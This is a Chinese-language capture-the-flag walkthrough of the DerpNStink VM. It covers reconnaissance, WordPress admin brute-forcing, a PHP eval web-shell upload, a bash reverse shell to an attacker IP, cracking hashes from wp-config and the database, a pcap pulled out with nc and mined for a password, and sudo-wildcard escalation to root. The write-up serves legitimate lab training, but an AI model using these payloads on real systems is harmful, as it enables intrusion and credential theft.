# 信息搜集

1、端口探测

```bash
nmap -sn -n --min-rate 1000 192.168.10.0/24
ip=192.168.10.8
ports=$(nmap -p- -sS -n --min-rate=1000 $ip | grep -oE '(^[0-9][^/tcp]*)' | tr '\n' ',')
nmap -p$ports -sV -sC -O $ip -oN nmap.txt
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 124ef86e7b6cc6d87cd82977d10beb72 (DSA)
|   2048 72c51c5f817bdd1afb2e5967fea6912f (RSA)
|   256 06770f4b960a3a2c3bf08c2b57b597bc (ECDSA)
|_  256 28e8ed7c607f196ce3247931caab5d2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/php/ /temporary/
|_http-title: DeRPnStiNK
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 00:0C:29:81:62:4E (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

开了 21、22、80 共三个端口

2、80 端口初探

查看源码时，发现提示，是让我们绑定 hosts

<img src=".\图片\Snipaste_2023-08-18_10-48-30.png" alt="Snipaste_2023-08-18_10-48-30" style="zoom:80%;" />

主页无法右键源代码，用 F12 查看，得到第一个 flag

<img src=".\图片\Snipaste_2023-08-18_10-49-55.png" alt="Snipaste_2023-08-18_10-49-55" style="zoom:80%;" />

```
flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166)
```

当我们继续查看目录 http://192.168.10.8/webnotes/  时

得到一个域名解析为本地

<img src=".\图片\Snipaste_2023-08-18_10-53-24.png" alt="Snipaste_2023-08-18_10-53-24" style="zoom:80%;" />

于是绑定 hosts

```
192.168.10.8 derpnstink.local
```

# Web打点

## wordpress站点

1、扫描网站目录

```bash
└─# gobuster dir -u http://derpnstink.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak
```

```
===============================================================
/.html.bak            (Status: 403) [Size: 292]
/.php                 (Status: 403) [Size: 287]
/.html                (Status: 403) [Size: 288]
/index.html           (Status: 200) [Size: 1298]
/weblog               (Status: 301) [Size: 320] [--> http://derpnstink.local/weblog/]
/php                  (Status: 301) [Size: 317] [--> http://derpnstink.local/php/]
/css                  (Status: 301) [Size: 317] [--> http://derpnstink.local/css/]
/js                   (Status: 301) [Size: 316] [--> http://derpnstink.local/js/]
/javascript           (Status: 301) [Size: 324] [--> http://derpnstink.local/javascript/]
/robots.txt           (Status: 200) [Size: 53]
```

2、查看 `/weblog` 目录，`whatweb` 查看基本信息，为 `wordpress` 站点

```bash
└─# whatweb http://derpnstink.local/weblog/
```

```bash
http://derpnstink.local/weblog/ [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[192.168.10.8], JQuery[1.12.4], MetaGenerator[WordPress 4.6.26], PHP[5.5.9-1ubuntu4.22], PoweredBy[WordPress], Script[text/javascript], Title[DeRPnStiNK Professional Services &#8211; CaniHazURMoneyPlz], UncommonHeaders[link], WordPress[4.6.26], X-Powered-By[PHP/5.5.9-1ubuntu4.22], x-pingback[http://derpnstink.local/weblog/xmlrpc.php]
```

3、上 wpscan

先枚举用户，找到用户名 `admin`

```bash
└─# wpscan --url http://derpnstink.local/weblog/ --enumerate u  
```

```
[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.7 (Ubuntu)
 |  - X-Powered-By: PHP/5.5.9-1ubuntu4.22
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://derpnstink.local/weblog/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://derpnstink.local/weblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://derpnstink.local/weblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.6.26 identified (Outdated, released on 2023-05-16).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://derpnstink.local/weblog/, Match: '-release.min.js?ver=4.6.26'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://derpnstink.local/weblog/, Match: 'WordPress 4.6.26'

[+] WordPress theme in use: twentysixteen
 | Location: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.26
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.26, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

综合扫描，可以利用 已知漏洞

```bash
└─# wpscan --url http://derpnstink.local/weblog/ --enumerate vp,vt,tt,u
```

```bash
Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.7 (Ubuntu)
 |  - X-Powered-By: PHP/5.5.9-1ubuntu4.22
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://derpnstink.local/weblog/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://derpnstink.local/weblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://derpnstink.local/weblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.6.26 identified (Outdated, released on 2023-05-16).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://derpnstink.local/weblog/, Match: '-release.min.js?ver=4.6.26'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://derpnstink.local/weblog/, Match: 'WordPress 4.6.26'

[+] WordPress theme in use: twentysixteen
 | Location: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.26
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.26, Match: 'Version: 1.3'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] slideshow-gallery
 | Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/
 | Last Updated: 2023-06-25T18:14:00.000Z
 | [!] The version is out of date, the latest version is 1.7.8
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 6 vulnerabilities identified:
 |
 | [!] Title: Slideshow Gallery < 1.4.7 - Arbitrary File Upload
 |     Fixed in: 1.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/b1b5f1ba-267d-4b34-b012-7a047b1d77b2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460
 |      - https://www.exploit-db.com/exploits/34681/
 |      - https://www.exploit-db.com/exploits/34514/
 |      - https://seclists.org/bugtraq/2014/Sep/1
 |      - https://packetstormsecurity.com/files/131526/
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload/
 |
 | [!] Title: Tribulant Slideshow Gallery <= 1.5.3 - Arbitrary file upload & Cross-Site Scripting (XSS) 
 |     Fixed in: 1.5.3.4
 |     References:
 |      - https://wpscan.com/vulnerability/f161974c-36bb-4fe7-bbf8-283cfe9d66ca
 |      - http://cinu.pl/research/wp-plugins/mail_5954cbf04cd033877e5415a0c6fba532.html
 |      - http://blog.cinu.pl/2015/11/php-static-code-analysis-vs-top-1000-wordpress-plugins.html
 |
 | [!] Title: Tribulant Slideshow Gallery <= 1.6.4 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 1.6.5
 |     References:
 |      - https://wpscan.com/vulnerability/bdf963a1-c0f9-4af7-a67c-0c6d9d0b4ab1
 |      - https://sumofpwn.nl/advisory/2016/cross_site_scripting_vulnerability_in_tribulant_slideshow_galleries_wordpress_plugin.html
 |      - https://plugins.trac.wordpress.org/changeset/1609730/slideshow-gallery
 |
 | [!] Title: Slideshow Gallery <= 1.6.5 - Multiple Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 1.6.6
 |     References:
 |      - https://wpscan.com/vulnerability/a9056033-97c7-4753-822f-faf99f4081e2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17946
 |      - https://www.defensecode.com/advisories/DC-2017-01-014_WordPress_Tribulant_Slideshow_Gallery_Plugin_Advisory.pdf
 |      - https://packetstormsecurity.com/files/142079/
 |
 | [!] Title: Slideshow Gallery <= 1.6.8 - XSS and SQLi
 |     Fixed in: 1.6.9
 |     References:
 |      - https://wpscan.com/vulnerability/57216d76-7cba-477e-a6b5-1e409913a0fc
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18017
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18018
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18019
 |      - https://plugins.trac.wordpress.org/changeset?reponame=&new=1974812%40slideshow-gallery&old=1907382%40slideshow-gallery
 |      - https://ansawaf.blogspot.com/2019/04/xss-and-sqli-in-slideshow-gallery.html
 |
 | [!] Title: Slideshow Gallery < 1.7.4 - Admin+ Stored Cross-Site Scripting
 |     Fixed in: 1.7.4
 |     References:
 |      - https://wpscan.com/vulnerability/6d71816c-8267-4b84-9087-191fbb976e72
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24882
 |
 | Version: 1.4.6 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:00 <=================================================================================> (619 / 619) 100.00% Time: 00:00:00
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:04 <===============================================================================> (2575 / 2575) 100.00% Time: 00:00:04

[i] No Timthumbs Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

4、wpscan 爆破后台密码

```bash
└─# wpscan --url http://derpnstink.local/weblog/ -eu -P dict.list
```

得到用户名密码 admin:admin

然后登录

```http
http://derpnstink.local/weblog/wp-login.php
```

## wp站点拿shell

这里登录后，找到了文件上传的功能点

<img src=".\图片\Snipaste_2023-08-18_11-35-51.png" alt="Snipaste_2023-08-18_11-35-51" style="zoom:80%;" />

上传 shell.php   `GIF89a<?php eval($_POST[x]); ?>` ，然后访问触发

<img src=".\图片\Snipaste_2023-08-18_11-37-26.png" alt="Snipaste_2023-08-18_11-37-26" style="zoom:80%;" />

反弹 shell 

```
x=system("/bin/bash -c 'bash -i &>/dev/tcp/192.168.10.9/1234 <&1'");
```

<img src=".\图片\Snipaste_2023-08-18_11-47-45.png" alt="Snipaste_2023-08-18_11-47-45" style="zoom:80%;" />

交互 shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

# 提权

## 二次信息搜集

1、查看 `/etc/passwd`

```bash
cat /etc/passwd | grep 'sh\|home' | sort -u
```

```bash
mrderp:x:1000:1000:Mr. Derp,,,:/home/mrderp:/bin/bash
root:x:0:0:root:/root:/bin/bash
saned:x:108:115::/home/saned:/bin/false
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin
stinky:x:1001:1001:Uncle Stinky,,,:/home/stinky:/bin/bash
syslog:x:101:104::/home/syslog:/bin/false
usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
```

```bash
www-data@DeRPnStiNK:/var/www/html/weblog$ ls -al /home
ls -al /home
total 16
drwxr-xr-x  4 root   root   4096 Nov 12  2017 .
drwxr-xr-x 23 root   root   4096 Nov 12  2017 ..
drwx------ 10 mrderp mrderp 4096 Jan  9  2018 mrderp
drwx------ 12 stinky stinky 4096 Jan  9  2018 stinky
```

家目录发现两个用户 `mrderp`、`stinky`，可整理成用户名字典

2、查看网站配置文件

发现 mysql 数据库的 用户名密码为 root:mysql

```bash
www-data@DeRPnStiNK:/var/www/html/weblog$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

3、连接数据库查看信息

```bash
www-data@DeRPnStiNK:/var/www/html/weblog$ mysql -uroot -pmysql
```

```bash
mysql> select * from wp_users;
select * from wp_users;
+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+
| ID | user_login  | user_pass                          | user_nicename | user_email                   | user_url | user_registered     | user_activation_key                           | user_status | display_name | flag2 |
+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+
|  1 | unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 | unclestinky   | unclestinky@DeRPnStiNK.local |          | 2017-11-12 03:25:32 | 1510544888:$P$BQbCmzW/ICRqb1hU96nIVUFOlNMKJM1 |           0 | unclestinky  |       |
|  2 | admin       | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ | admin         | admin@derpnstink.local       |          | 2017-11-13 04:29:35 |                                               |           0 | admin        |       |
+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+
2 rows in set (0.00 sec)
```

用 john 爆破后得到 明文为 `wedgie57`

## 提权到stinky用户

```bash
www-data@DeRPnStiNK:/var/www/html/weblog$ su stinky
su stinky
Password: wedgie57

stinky@DeRPnStiNK:/var/www/html/weblog$ 
```

于是在家目录信息搜集，递归查看

```bash
stinky@DeRPnStiNK:~$ ls -alR
```

也发现了 .ssh 下的公私钥，可以尝试私钥 ssh 连接 stinky 用户，我们这里也不必，因为当前权限已经是 stinky 用户

```bash
./.ssh:
total 20
drwxr-xr-x  2 stinky stinky 4096 Nov 12  2017 .
drwx------ 12 stinky stinky 4096 Jan  9  2018 ..
-rwxr-xr-x  1 root   root    399 Nov 12  2017 authorized_keys
-rwxr-xr-x  1 stinky stinky 1675 Nov 12  2017 id_rsa
-rwxr-xr-x  1 stinky stinky  399 Nov 12  2017 id_rsa.pub
```

同时也发现了一个流量文件

```bash
./Documents:
total 4300
drwxr-xr-x  2 stinky stinky    4096 Nov 13  2017 .
drwx------ 12 stinky stinky    4096 Jan  9  2018 ..
-rw-r--r--  1 root   root   4391468 Nov 13  2017 derpissues.pcap
```

## 提权到mrderp用户

紧接上文找到了流量文件

下载到本地，用 nc

```
kali执行：nc -l -p 9999 > derp.pcap 
目标靶机执行：nc 192.168.10.9 9999 < derpissues.pcap
```

### 分析流量文件

本地使用 wireshark 查看该数据包，要想快速知道账号和密码，前提是知道目标登录的是 web，登录一般形式都是 POST 请求，所以我们使用 wireshark 进行过滤，只看 POST 请求那么就可以快速找到用户名和密码，具体如下：

```
http.request.method=="POST"
```

<img src=".\图片\Snipaste_2023-08-18_12-47-05.png" alt="Snipaste_2023-08-18_12-47-05" style="zoom:80%;" />

瞬间确定了目标靶机用户 `mrderp` 的密码为 `derpderpderpderpderpderpderp`

这里还有另外分析流量文件方法，具体如下：

```bash
tcpdump -qns 0 -X -r derp.pcap > bmfxderp.txt
tcpdump -nt -r derp.pcap -A 2>/dev/null | grep -P 'pwd='
```

接下里可以 mrderp 用户 ssh 登录，也可以 su mrderp 来切换用户

## 提权到root

紧接上文，以下为 sudo 提权

mrderp 用户 查看 `sudo -l`

```bash
mrderp@DeRPnStiNK:~$ sudo -l
sudo -l
[sudo] password for mrderp: derpderpderpderpderpderpderp

Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
```

并没找到 `binaries` 目录

```bash
mrderp@DeRPnStiNK:~$ ls
ls
Desktop  Documents  Downloads
```

那么就直接新建一个这个目录，然后新建一个文件 `derpy` 类似的名称即可，最后给其执行权限，`sudo` 执行即可提权

这里的 `derpy.sh` 里面的内容可以是反弹 shell 的内容，也可以是 `bash -i` 或者 `/bin/bash` 都可以

```bash
mrderp@DeRPnStiNK:~/binaries$ echo '#!/bin/bash' > derpy.sh
mrderp@DeRPnStiNK:~/binaries$ echo '/bin/bash' >> derpy.sh
mrderp@DeRPnStiNK:~/binaries$ chmod +x derpy.sh 
mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh 
[sudo] password for mrderp: 
root@DeRPnStiNK:~/binaries# id
uid=0(root) gid=0(root) groups=0(root)
root@DeRPnStiNK:~/binaries# cat derpy.sh 
#!/bin/bash
/bin/bash
```

查看 flag

```bash
root@DeRPnStiNK:/root# find -name "flag.txt"
./Desktop/flag.txt
root@DeRPnStiNK:/root# cat ./Desktop/flag.txt
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)

Congrats on rooting my first VulnOS!

Hit me up on twitter and let me know your thoughts!

@securekomodo


```

# 总结

- 这里 wp 的插件存在漏洞，可以用 msf ，提权时也可以尝试内核漏洞，具体参考这篇文章 [渗透项目（七）：DERPNSTINK: 1_Ays.Ie的博客-CSDN博客](https://blog.csdn.net/weixin_43938645/article/details/127820275)
- `whatweb` 工具可以查看网站简单的信息

- 这里的 wp 后台拿 shell 是靠的文件上传


- 提权二次信息搜集时，注意 /home 目录下有家的用户里的文件信息
- sudo 提权，这里是可以自定义一个规定路径下的文件（可以是 sh 脚本，可以是反弹 shell 或者 /bin/bash），sudo 执行即可提权

- 注意在枚举的过程中收集用户名和密码为字典，后面好爆破


- 分析流量文件 `*.pcap` 时 ，可以用 `wireshark`  过滤，或者  `tcpdump` 后 `grep` 查找过滤


